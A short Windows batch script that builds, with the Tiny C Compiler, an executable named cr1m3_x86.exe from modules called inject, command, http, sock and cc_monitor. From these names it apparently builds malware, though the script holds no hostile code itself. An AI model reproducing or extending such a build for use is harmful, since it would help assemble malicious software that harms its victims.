@echo off

set options = "-w -g -nostdlib -nostdinc -MD"

rmdir /Q /S obj\
rmdir /Q /S bin\
mkdir obj
mkdir bin

C:\tinyc\tcc32\tiny_impdef.exe %systemroot%\system32\wininet.dll -o C:\tinyc\tcc32\lib\wininet.def
C:\tinyc\tcc32\tiny_impdef.exe %systemroot%\system32\crypt32.dll -o C:\tinyc\tcc32\lib\crypt32.def
C:\tinyc\tcc32\tiny_impdef.exe %systemroot%\system32\advapi32.dll -o C:\tinyc\tcc32\lib\advapi32.def
C:\tinyc\tcc32\tiny_impdef.exe %systemroot%\system32\psapi.dll -o C:\tinyc\tcc32\lib\psapi.def
C:\tinyc\tcc32\tiny_impdef.exe %systemroot%\system32\ws2_32.dll -o C:\tinyc\tcc32\lib\ws32_32.def
C:\tinyc\tcc32\tiny_impdef.exe %systemroot%\system32\mswsock.dll -o C:\tinyc\tcc32\lib\mswsock.def


C:\tinyc\tcc32\tcc.exe %options% -c -o obj\command.o command.c
rem C:\tinyc\tcc32\tcc.exe %options% -c -o obj\security.o security.c
C:\tinyc\tcc32\tcc.exe %options% -c -o obj\http.o http.c
C:\tinyc\tcc32\tcc.exe %options% -c -o obj\misc.o misc.c
C:\tinyc\tcc32\tcc.exe %options% -c -o obj\base64.o base64.c
C:\tinyc\tcc32\tcc.exe %options% -c -o obj\inject.o inject.c
C:\tinyc\tcc32\tcc.exe %options% -c -o obj\sock.o sock.c
C:\tinyc\tcc32\tcc.exe %options% -c -o obj\info.o info.c
C:\tinyc\tcc32\tcc.exe %options% -c -o obj\cc_omintor.o cc_monitor.c
rem C:\tinyc\tcc\tcc.exe %options% -c -o obj\proc.o proc.c
C:\tinyc\tcc32\tcc.exe %options% -lws2_32 -lmswsock -ladvapi32 -lpsapi -lcrypt32 -lwininet -luser32 -o bin\cr1m3_x86.exe main.c obj\inject.o obj\base64.o obj\misc.o obj\http.o obj\command.o

del obj\*.o
echo COMPILED...
dir bin\cr1m3_x86.exe | findstr cr1m3_x86.exe
